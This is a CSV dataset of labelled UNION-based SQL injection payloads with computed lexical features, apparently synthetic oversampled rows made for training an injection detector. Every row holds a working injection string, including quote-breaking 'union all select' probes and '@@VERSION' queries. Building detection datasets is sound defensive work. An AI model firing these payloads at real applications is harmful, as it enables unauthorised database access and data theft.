id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001696,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,1.733670909573033,78.0,25.259620624341142,4.042196375710159,34.569214002108346,18.778861873023427,15.348075875131771,9.303848249736456,0.4431950513090813,0.24075463939773623,0.1967702035273304,0.11928010576585199,2.3038482497364567,0.0,0.6519241248682284,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.6961517502635433,2.3038482497364567,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6519241248682284,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6519241248682284
SMOTE_001697,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,0.9176776262838742,55.0,19.207841791121684,3.634295603693186,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727272,0.16363636363636364,0.0,1.0,2.58431641775663,0.0,0.0,0.0,0.0,0.0,0.2078417911216849,0.0,5.0,2.5843164177566305,0.0,1.0,0.7921582088783151,0.20784179112168488,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001698,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.246230394444304,55.0,19.717745371672095,3.5583703173759464,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727272,0.16363636363636364,0.0,1.0,1.56450925665581,0.0,0.0,0.0,0.0,0.0,0.717745371672095,0.0,5.0,1.56450925665581,0.0,1.0,0.28225462832790504,0.717745371672095,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001699,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.06405521668525382,76.0,26.0,3.9053353428582103,40.02541569970585,2.0254156997058512,23.025415699705853,10.923752900882441,0.526650206575077,0.026650206575076968,0.30296599604876123,0.14373359080108475,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.949168600588294,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001700,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,1.82265230272596,79.0,26.36294424405857,3.9533311648204648,36.007613315355705,10.621829125230015,21.37055755941428,11.0,0.4557925736120976,0.13445353323075965,0.2705133868280289,0.13924050632911392,3.0,0.0,2.362944244058572,0.0,0.6370557559414279,1.0,0.0,1.6370557559414278,0.0,0.0,1.3629442440585717,4.362944244058572,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.6370557559414278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.637055755941428
SMOTE_001701,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.35554581649836453,63.473476316003975,21.298231754400266,3.8402696391890077,14.0,31.57878105280318,8.0,9.894695263200795,0.22294350242234182,0.49424891096364554,0.12739628709848105,0.15541129951553165,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.894695263200795,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001702,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,1.2129427287686454,73.41620508220893,32.791897458895534,4.399427931681343,42.41620508220893,2.7918974588955354,17.0,11.208102541104465,0.5776990607394478,0.038093132283606806,0.23158438604610926,0.1526234209308361,0.0,0.0,2.0,0.0,1.2081025411044646,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.416205082208929,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.7918974588955355,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.791897458895535
SMOTE_001703,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,1.9388494669519238,80.19487434931797,20.207688476023037,3.5189325163507994,54.16924609590785,4.220502602728104,12.207688476023039,9.597437174658987,0.6746696901326419,0.053237355285459975,0.15247369100099523,0.11961926358090298,0.5974371746589872,0.0,0.0,0.0,0.0,0.4025628253410129,0.0,1.0,0.0,0.0,6.597437174658987,0.40256282534101273,0.5974371746589872,0.0,0.0,1.0,0.0,0.4025628253410128,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.4025628253410128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.402562825341013
SMOTE_001704,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,1.441248223804912,75.20583164728457,22.291859104055032,3.707179863311516,43.497690751339604,9.0,14.0,8.708140895944966,0.5760727813451196,0.1204732480196469,0.18740283025278404,0.11605114038244942,0.29185910405503307,0.0,0.5837182081100665,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.124422687834901,1.5837182081100663,0.2918591040550331,0.0,0.29185910405503307,0.7081408959449669,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001705,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.5222050043382699,69.13986846915486,20.720263061690286,3.55063980800983,14.0,40.0,4.0,11.139868469154857,0.20249313487201492,0.5785518139200426,0.05785518139200427,0.1610998698159382,1.0,0.0,1.2797369383097132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.279736938309713,1.0,0.0,0.13986846915485662,0.8601315308451434,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001706,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,1.3084389608062454,68.80078257716247,21.316731881430204,3.6937210084996273,14.0,36.0,7.1673188143020505,11.63346376286041,0.2047530557282169,0.5265078575868434,0.09963488364055616,0.16910420304438353,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6334637628604102,1.0,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3167318814302051,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001707,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,1.7355210774196244,56.92253649084081,19.230985403663677,3.5178778192824383,14.0,29.538029192672646,4.0,9.384507298168161,0.24638923912976624,0.51841229813741,0.07039692546564749,0.16480153726717625,0.0,1.0,1.7690145963363242,0.0,0.0,0.0,0.0,0.0,0.6154927018318379,0.0,5.384507298168162,1.7690145963363242,0.0,1.0,0.38450729816816204,0.6154927018318379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001708,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.1138630909027565,73.87669432282897,30.24661135434208,4.229285829106218,42.831074236228055,2.0,18.75338864565792,10.292231440942986,0.5804062489257702,0.02708122050366657,0.25326127751350686,0.13925125305705632,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.5844628818859742,0.0,0.0,0.9999999999999996,5.292231440942987,0.0,0.0,1.0,0.0,0.0,1.0,0.29223144094298703,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001709,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.757333820385829,66.28937954980768,22.0,3.59675854371002,14.0,28.947493933589772,12.578759099615342,10.763126516602558,0.2112753466190981,0.43735528595053635,0.18906845755058782,0.16230090987977774,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.763126516602557,0.7631265166025571,0.0,5.236873483397443,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001710,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,0.3469450877556103,58.35345907210315,18.32930818557937,3.568055132762924,14.0,30.682767257682514,4.0,9.670691814420628,0.24031865848198666,0.5253501045920153,0.06866247385199617,0.1656687630740019,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.670691814420629,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001711,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,0.39287908997904425,74.85610881751491,21.127099020276123,3.57373294507608,14.0,31.491603918895514,17.491603918895514,11.872900979723878,0.1873555531333054,0.4206532630941834,0.23329770996087798,0.15869347381163312,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.8729009797238785,0.12709902027612166,0.0,5.8729009797238785,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001712,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.1400345958412338,69.0,18.511947627336372,3.623880370249473,14.0,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001713,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,0.09016707736100238,75.10248969278541,31.91800824577167,4.415361953613724,40.0,3.0,17.122987631342493,14.979502061442918,0.532650068714764,0.039948755153607296,0.22791362459555584,0.19948755153607295,3.0,0.0,2.0,0.0,1.9795020614429175,1.0,0.0,0.04099587711416475,0.0,0.0,0.9999999999999996,6.959004122885835,1.0,0.0,1.0,0.0,0.0,1.0,0.020497938557082374,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001714,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,0.9428747353210905,58.928472628278584,21.26622478438896,3.6753169295221237,14.0,22.129798275111696,14.0,8.798674353166886,0.23907286332731872,0.3733206958530606,0.23907286332731875,0.14853357749230195,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.26622478438896174,0.0,3.5324495687779236,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001715,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.52305055954212,71.74786890427306,22.0,3.809576217315458,42.11440103274141,9.0,13.114401032741412,7.519066838790236,0.588021534489456,0.12648307295099456,0.18046496609180696,0.10503042646774238,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5190668387902355,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.5190668387902354,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001716,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,0.7520656068423945,64.46870852921157,21.29427428923237,3.745081096114734,14.0,26.822902843070523,12.234354264605786,11.411451421535261,0.2188650421720163,0.4167104922560062,0.18733565403997673,0.1770888115320008,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.705725710767631,1.0,0.0,4.705725710767631,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001717,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,1.3318090903776696,67.68006999857064,19.927972000571742,3.746855563832673,14.0,36.288111997713024,5.855944001143487,11.536013999714127,0.20713824615824417,0.5347175911861728,0.08773534067818937,0.17040882197739368,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.463986000285872,0.0,0.0,7.072027999428256,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.46398600028587206,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001718,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,0.48076179261857305,72.30797683524699,20.26031125611585,3.6639795578084784,14.0,37.917509951073214,8.780933768347545,11.609533115826228,0.19443693493720476,0.5213949186906377,0.12390901288784723,0.16025913348431037,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.130155628057924,0.0,0.0,7.4793774877683035,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001719,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.6541335337711023,76.77187197203415,31.491251211186338,4.231239283935045,42.0,3.754374394406831,20.771871972034152,10.245625605593169,0.5475204385624457,0.04878006934941975,0.2699727485834058,0.13372674350472877,0.0,0.0,2.0,0.0,1.0,1.7543743944068302,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001720,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,0.011830206025090178,66.02208935227507,15.004417870455015,3.021899993595566,50.0,1.0,4.017671481820058,11.004417870455015,0.7573400623956992,0.015146801247913955,0.06083609910179762,0.16667703725458924,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0044178704550146275,0.0,0.0,8.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0044178704550146275,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001721,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,2.231090626752199,69.2809238151835,23.235966140081555,3.822548536280378,18.449453442612135,21.617983070040776,19.617983070040776,9.595504232489805,0.2608736250059241,0.3134468697658988,0.28412466162685995,0.14155484360131715,0.0,1.0,3.0,0.0,0.0,0.4044957675101942,0.0,2.5955042324898057,0.0,0.0,2.5955042324898057,3.4044957675101943,0.0,1.0,1.0,0.0,0.0,0.4044957675101941,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.4044957675101941,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4044957675101943
SMOTE_001722,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,1.3565016013827202,65.77415669839877,21.2655143540925,3.737633816181775,14.0,29.875885167260023,11.796543062277491,10.101728468861253,0.21470133057652133,0.447463277457087,0.18492488547216313,0.15291050649422852,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6327571770462486,0.0,0.0,5.468971291815006,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001723,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.16697620629799412,76.0,26.0,3.9027819356873716,40.06625248241906,2.0662524824190616,23.066252482419063,10.80124255274281,0.5271875326634087,0.027187532663408703,0.3035033221370929,0.1421216125360896,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.867495035161873,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001724,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,1.6968668835078455,70.2691099681568,22.0,3.6571523716539067,14.0,33.60418851684024,11.197905741579882,11.467015709736685,0.19972417516050925,0.4751806275756162,0.16185803653321035,0.16323716073066422,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5329842902633137,0.5329842902633137,0.0,6.401047129210059,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001725,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,1.288458810472431,75.21662323000552,20.811082153337015,3.7128010659845705,14.0,38.37783569332596,10.433246460011048,12.405541076668507,0.1861999429238194,0.5109327680073537,0.1380005707618065,0.1648667183070206,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.405541076668508,0.4055410766685078,0.0,7.5944589233314925,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001726,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,0.3377697921730885,56.96547756386796,15.903452243613206,3.249675412467214,39.158573076641545,1.0,7.613808974452817,9.193095512773592,0.6861991192816408,0.017595920572546553,0.13491598540541505,0.1612889747403976,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9034522436132044,0.0,0.0,5.289643269160386,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9034522436132043,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001727,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,1.8775871105353577,66.02818058637767,17.802254446910215,3.358026090008538,46.42367169255725,1.0,9.20338167036532,9.401127223455108,0.6985570442021284,0.015646344667906154,0.14002732117491987,0.14576928995504562,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.598872776544893,0.0,5.802254446910214,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001728,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.42000801481221334,68.2827025190062,21.143459496198762,3.5632481733419734,14.0,38.85232403040992,4.573837984795043,10.85654050380124,0.20517259165170137,0.5682749676943017,0.06758695898433724,0.1589654816696597,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.14345949619876064,0.0,0.0,7.713081007602479,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.14345949619876064,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
